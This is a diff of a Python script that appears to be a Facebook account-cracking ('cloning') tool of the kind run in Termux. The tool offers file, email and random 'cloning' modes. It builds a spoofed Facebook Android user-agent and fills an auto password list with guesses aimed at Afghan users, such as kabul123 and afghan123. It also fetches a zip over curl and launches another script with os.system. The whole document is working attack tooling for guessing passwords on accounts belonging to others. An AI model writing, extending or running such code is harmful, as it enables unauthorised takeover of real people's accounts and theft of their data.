@@ -29,7 +29,7 @@ if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
         os.system('clear')
         print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
         os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
-        os.system('python jan.py')
+        os.system('python Saadat.py')
 else:
         akk2="rsi"
         akk=f"cha{akk2}fi"
@@ -353,7 +353,7 @@ def method_crack():
         print(logo);xchker()
         print(' [1] File Cloning ')
         print(' [2] Email Cloning ')
-        print(' [3] Number Cloning ')
+        print(' [3] Random Cloning ')
         print(' [0] Back')
         print(50*'-')
         clone_ = input(' Select : ')
@@ -441,7 +441,7 @@ class crack_main():
                                 except:
                                         version_ = str(random.randint(7,13))
                                         model_ = "Samsung"
-                                        brand_name_ = "Samsung"
+                                        brand_name_ = "Samsung,vivo"
                                         width_ = "720"
                                         height_ = "1280"
                                 uas = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
@@ -472,47 +472,26 @@ class crack_main():
                 except Exception as e:
                         pass
                         #print(e)
-
-        def pasw(self):
-                passlist = []
-                if not os.path.exists('device_info.txt'):
-                        os.system('clear')
-                        print(logo)
-                        print(" what is your andriod version ex 8,9,10")
-                        version_=input(' type andriod version : ')
-                        print(44*'-')
-                        print(" your mobile module name ex Techno LD7 vivo etc")
-                        model_=input(" module name : ")
-                        print(44*"-")
-                        print(" your mobile company name ex Techno,Redmi")
-                        brand_name_=input(" device company name : ")
-                        print(44*'-')
-                        print(" your mobile width ex 720,740,730,780 etc")
-                        width_=input(" device width : ")
-                        print(44*'-')
-                        print(" your mobile height ex 1660,1780,1730 etc")
-                        height_=input(" device company name : ")
-                        info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
-                os.system('clear')
+                        
                 print(logo);xchker()
                 print(' for auto password list type auto or Auto')
                 print(50*"-")
                 pl = input(' How Much Password Do You Want To Add ? ')
                 if pl in ['auto','Auto','AUTO','auto or Auto']:
-                        passlist.append('first123')
-                        passlist.append('first12345')
-                        passlist.append('first1234')
-                        passlist.append('khan12')
-                        passlist.append('khankhan')
+                        passlist.append('100200')
+                        passlist.append('500600')
+                        passlist.append('1000200')
+                        passlist.append('۱۲۳۴۵۶')
                         passlist.append('khan123')
-                        passlist.append('first786')
-                        passlist.append('first12')
-                        passlist.append('first1122')
-                        passlist.append('last123')
-                        passlist.append('last12')
-                        passlist.append('i love you')
+                        passlist.append('kabul123')
+                        passlist.append('786786')
+                        passlist.append('afghan123')
+                        passlist.append('afghanistan')
+                        passlist.append('kabul123')
+                        passlist.append('kabul1234')
+                        passlist.append('kabul12345')
                 else:
-                        print(' Example first123,last123,khan123,firstlast')
+                        print(' Example 100200,10002000,khan123,kabul123')
                         print(50*"-")
                         for cd in range(int(pl)):
                                 passlist.append(input(f' ({cd+1}) Password : '))
